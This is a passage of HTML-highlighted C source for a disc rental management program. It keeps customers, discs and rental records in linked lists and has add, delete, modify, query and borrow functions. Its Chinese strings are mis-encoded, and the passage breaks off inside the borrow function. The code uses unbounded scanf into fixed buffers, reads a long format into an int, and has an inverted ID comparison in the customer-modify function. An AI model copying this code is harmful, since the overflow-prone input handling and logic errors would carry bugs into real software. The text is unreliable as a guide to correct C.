class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; DiscInfo;</span><br><span class="line"><span class="comment">// æ¯ä¸€æ¡å€Ÿé˜…è®°å½•</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> CId;</span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> BDate;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> RDate;</span><br><span class="line">    <span class="keyword">long</span> rentNum;</span><br><span class="line">    <span class="keyword">int</span> isReturn;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; RentInfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Blist;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> acount;</span><br><span class="line">    Blist *RentList;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; CustomerInfo;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerInitial</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"customer.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt not existï¼\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            CustomerInfo *cRead = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">            cRead-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;id = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, cRead-&gt;name);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;cRead-&gt;acount);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, <span class="string">"END"</span>)) &#123;</span><br><span class="line">                Blist *b = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                <span class="built_in">strcpy</span>(b-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                b-&gt;next = cRead-&gt;RentList;</span><br><span class="line">                cRead-&gt;RentList = b;</span><br><span class="line">                <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            cRead-&gt;next = (*L);</span><br><span class="line">            (*L) = cRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\nè¯»å–åˆ°çš„é¡¾å®¢ä¿¡æ¯ï¼š\n\n"</span>);</span><br><span class="line">        CustomerInfo *c = *L;</span><br><span class="line">        <span class="keyword">while</span> (c != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %ld"</span>, c-&gt;id, c-&gt;name, c-&gt;acount);</span><br><span class="line">            Blist *b = c-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" %s"</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            c = c-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discInitial</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">500</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">"disc.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"disc.txt not existï¼\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            DiscInfo *dRead = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">            dRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(dRead-&gt;name, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;country);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;type);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;director);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;producer);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;stars);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;dRead-&gt;inventory);</span><br><span class="line">            dRead-&gt;next = (*L);</span><br><span class="line">            *L = dRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\nè¯»å–åˆ°çš„ç¢Ÿç‰‡ä¿¡æ¯ï¼š\n\n"</span>);</span><br><span class="line">        DiscInfo *d = *L;</span><br><span class="line">        <span class="keyword">while</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s %s %s %s %s %s %d\n"</span>, d-&gt;name, d-&gt;country, d-&gt;type,</span><br><span class="line">                   d-&gt;director, d-&gt;producer, d-&gt;stars, d-&gt;inventory);</span><br><span class="line">            d = d-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rentInitial</span><span class="params">(RentInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"rent.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt not existï¼\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            RentInfo *rRead = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">            rRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            rRead-&gt;CId = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, rRead-&gt;DName);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;BDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;RDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;rRead-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;rRead-&gt;isReturn);</span><br><span class="line">            rRead-&gt;next = *L;</span><br><span class="line">            *L = rRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\nè¯»å–åˆ°çš„å€Ÿé˜…ä¿¡æ¯\n\n"</span>);</span><br><span class="line">        RentInfo *r = *L;</span><br><span class="line">        <span class="keyword">while</span> (r != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %lld %lld %ld %d\n"</span>, r-&gt;CId, r-&gt;DName, r-&gt;BDate,</span><br><span class="line">                   r-&gt;RDate, r-&gt;rentNum, r-&gt;isReturn);</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discAdd</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *newDisc = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">    newDisc-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿåå­—:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿå›½å®¶:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;country);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿç±»å‹:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;type);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿå¯¼æ¼”:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;director);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿåˆ¶ç‰‡äºº:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;producer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿä¸»æ¼”æ˜æ˜Ÿ(å¦‚æœ‰å¤šä¸ªï¼Œæ¯ä¸ªæ˜æ˜Ÿä¹‹é—´ä»¥ç©ºæ ¼éš”å¼€):\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    fgets(newDisc-&gt;stars, <span class="keyword">sizeof</span>(newDisc-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å½±ç¢Ÿåº“å­˜é‡:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newDisc-&gt;inventory);</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newDisc-&gt;next = *L;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ·»åŠ å®Œæ¯•\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discQuery</span><span class="params">(DiscInfo *L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦æŸ¥è¯¢çš„ç¢Ÿç‰‡åå­—:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;inventory &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"å¯ä»¥å€Ÿé˜…ï¼\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ä¸å¯ä»¥å€Ÿé˜…ï¼Œå› ä¸ºåº“å­˜ä¸ºé›¶\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ä¸å­˜åœ¨è¯¥å½±ç¢Ÿ"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discDelete</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¿˜æ²¡æœ‰ç”¨æˆ·ï¼Œæ— æ³•åˆ é™¤!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    DiscInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦åˆ é™¤çš„ç¢Ÿç‰‡åå­—:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// åˆ é™¤å¤´èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        (*L) = (*L)-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"åˆ é™¤æˆåŠŸ"</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ä¸å­˜åœ¨è¯¥å½±ç‰‡\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p2-&gt;next = p1-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p1);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"åˆ é™¤æˆåŠŸ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discModify</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦ä¿®æ”¹çš„ç¢Ÿç‰‡çš„åå­—:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿå›½å®¶:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;country);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿç±»å‹:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;type);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿå¯¼æ¼”:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;director);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿåˆ¶ç‰‡äºº:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;producer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿä¸»æ¼”æ˜æ˜Ÿ(å¦‚æœ‰å¤šä¸ªï¼Œæ¯ä¸ªæ˜æ˜Ÿä¹‹é—´ä»¥ç©ºæ ¼éš”å¼€):\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        fgets(p-&gt;stars, <span class="keyword">sizeof</span>(p-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°å½±ç¢Ÿåº“å­˜é‡:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;inventory);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ä¿®æ”¹æˆåŠŸï¼\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ä¸å­˜åœ¨è¯¥å½±ç¢Ÿ"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerAdd</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *newCustomer = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">    newCustomer-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥é¡¾å®¢åå­—ï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newCustomer-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥é¡¾å®¢è´¦æˆ·idï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥é¡¾å®¢è´¦æˆ·é‡‘é¢ï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;acount);</span><br><span class="line">    newCustomer-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newCustomer-&gt;next = *L;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ·»åŠ å®Œæ¯•\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerDelete</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¿˜æ²¡æœ‰ç”¨æˆ·ï¼Œæ— æ³•åˆ é™¤!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    CustomerInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦åˆ é™¤çš„é¡¾å®¢åå­—ï¼š\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// åˆ é™¤å¤´èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*L)-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"è¯¥ç”¨æˆ·è¿˜æœªå½’è¿˜å€Ÿé˜…çš„ç¢Ÿç‰‡ï¼Œä¸èƒ½åˆ é™¤ç”¨æˆ·\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            (*L) = (*L)-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p2);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"åˆ é™¤æˆåŠŸ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ä¸å­˜åœ¨è¯¥ç”¨æˆ·\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯¥ç”¨æˆ·è¿˜æœªå½’è¿˜å€Ÿé˜…çš„ç¢Ÿç‰‡ï¼Œä¸èƒ½åˆ é™¤ç”¨æˆ·\n"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2-&gt;next = p1-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(p1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"åˆ é™¤æˆåŠŸ"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerModify</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦ä¿®æ”¹çš„é¡¾å®¢çš„è´¦æˆ·idï¼š\n"</span>);</span><br><span class="line">    <span class="keyword">long</span> query;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (query != p-&gt;id) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°é¡¾å®¢åå­—:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°é¡¾å®¢è´¦æˆ·é‡‘é¢:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;p-&gt;acount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ä¿®æ”¹æˆåŠŸï¼\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ä¸å­˜åœ¨è¯¥ç”¨æˆ·"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">borrowDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å€Ÿé˜…äººçš„id,è¾“å…¥â€œ0â€ç»“æŸæœ¬æ¬¡å€Ÿé˜…\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ç”¨æˆ·ä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp-&gt;acount &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ç§Ÿé‡‘ä¸è¶³20å…ƒï¼Œæ— æ³•å€Ÿé˜…\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥å€Ÿé˜…æ—¥æœŸ(æ ¼å¼ï¼šå¹´æœˆæ—¥æ—¶åˆ†ç§’ï¼Œå¦‚20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"æ—¥æœŸæ ¼å¼é”™è¯¯\n"</span>);</span><br><span class="line">                <span 